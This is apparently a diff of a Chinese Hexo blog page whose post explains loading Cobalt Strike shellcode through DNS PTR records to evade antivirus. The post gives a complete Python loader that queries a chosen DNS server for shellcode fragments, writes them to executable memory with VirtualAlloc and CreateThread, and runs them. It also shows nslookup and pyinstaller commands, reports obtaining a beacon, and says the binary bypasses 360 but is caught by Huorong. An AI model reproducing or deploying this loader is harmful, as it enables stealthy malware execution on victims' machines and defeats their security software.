@@ -1,25 +1,254 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>python利用dns的PTR记录加载shellcode - Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。 PTR记录的两个特性 1.不区分大小写，dns解析结果统一转为小写 2.格式不定，可以出现包括“!@#$%^&amp;amp;*()_+&amp;#x3D;&amp;#x2F;?&amp;lt;&amp;gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。 在本地服务器添加  进行"><meta property="og:type" content="blog"><meta property="og:title" content="python利用dns的PTR记录加载shellcode"><meta property="og:url" content="http://example.com/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。 PTR记录的两个特性 1.不区分大小写，dns解析结果统一转为小写 2.格式不定，可以出现包括“!@#$%^&amp;amp;*()_+&amp;#x3D;&amp;#x2F;?&amp;lt;&amp;gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。 在本地服务器添加  进行"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png"><meta property="og:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png"><meta property="article:published_time" content="2021-02-26T07:53:11.000Z"><meta property="article:modified_time" content="2021-02-26T08:15:05.102Z"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"},"headline":"Hexo","image":["https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png","https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png"],"datePublished":"2021-02-26T07:53:11.000Z","dateModified":"2021-02-26T08:15:05.102Z","author":{"@type":"Person","name":"John Doe"},"description":"DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。 PTR记录的两个特性 1.不区分大小写，dns解析结果统一转为小写 2.格式不定，可以出现包括“!@#$%^&amp;*()_+&#x3D;&#x2F;?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\\”会被过滤。 在本地服务器添加  进行"}</script><link rel="canonical" href="http://example.com/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-26T07:53:11.000Z" title="2021-02-26T07:53:11.000Z">2021-02-26</time>发表</span><span class="level-item"><time dateTime="2021-02-26T08:15:05.102Z" title="2021-02-26T08:15:05.102Z">2021-02-26</time>更新</span><span class="level-item">7 分钟读完 (大约1015个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">python利用dns的PTR记录加载shellcode</h1><div class="content"><p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p>
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>python利用dns的PTR记录加载shellcode - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="python利用dns的PTR记录加载shellcode">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-26 15:53" pubdate>
+        2021年2月26日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      702 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">python利用dns的PTR记录加载shellcode</h1>
+            
+            <div class="markdown-body">
+              <p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p>
 <p>PTR记录的两个特性</p>
 <p>1.不区分大小写，dns解析结果统一转为小写</p>
 <p>2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。</p>
 <p>在本地服务器添加</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>进行反向解析查询，192.168.111.135为DNS服务器的ip</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt&#x3D;ptr 192.168.111.1 192.168.111.135</span><br></pre></td></tr></table></figure>
 
 
 
 <p>可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>只需要按照顺序对相应的ip发起请求即可获得部分shellcode</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> dns.reversename</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">dnsip=<span class="string">&#x27;192.168.111.135&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LoadshellCode</span>(<span class="params">shellcode</span>):</span>   <span class="comment">#执行shellcode</span></span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line">    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">    buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="number">0</span>),ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestptr</span>(<span class="params">dnsip,ipnum</span>):</span>      <span class="comment">#获取PTR记录</span></span><br><span class="line">    ipaddr=<span class="string">&#x27;192.168.111.%d&#x27;</span> %ipnum    <span class="comment">#添加的PTR记录中主机ip地址的C段地址</span></span><br><span class="line">    ip=dns.reversename.from_address(ipaddr)</span><br><span class="line">    my_resolver = dns.resolver.Resolver()</span><br><span class="line">    my_resolver.nameservers = [dnsip]</span><br><span class="line">    answer = my_resolver.resolve(ip,<span class="string">&#x27;PTR&#x27;</span>)</span><br><span class="line">    recvptr=<span class="built_in">str</span>(answer[<span class="number">0</span>]).strip(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> recvptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span>(<span class="params">shellcodedemo</span>):</span>    <span class="comment">#将得到的shellcode转为十六进制</span></span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    s1=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(shellcodedemo))):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s1 += <span class="built_in">bytes</span>.fromhex(shellcodedemo[i:i + <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">60</span>):    <span class="comment">#根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)</span></span><br><span class="line">        s+=requestptr(dnsip,i)</span><br><span class="line">    LoadshellCode(str2hex(s))</span><br></pre></td></tr></table></figure>
 
@@ -30,58 +259,207 @@
 <p>使用pyinstaller打包成exe文件，</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w dnsptrshellcode.py</span><br></pre></td></tr></table></figure>
 
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p>
+<p><a href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p>
 <p>拿到beacon</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" alt="imgbed.cn图床"></a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
 <p>可以绕过360，但被火绒查杀</p>
-<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" alt="imgbed.cn图床"></a></p>
-<p>github地址：<a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p>
+<p><a href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" srcset="/img/loading.gif" lazyload alt="imgbed.cn图床"></a></p>
+<p>github地址：<a href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p>
 <p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>
-</div><div class="article-licensing box"><div class="licensing-title"><p>python利用dns的PTR记录加载shellcode</p><p><a href="http://example.com/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/">http://example.com/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>John Doe</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-02-26</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-02-26</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/" alt="支付宝"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in 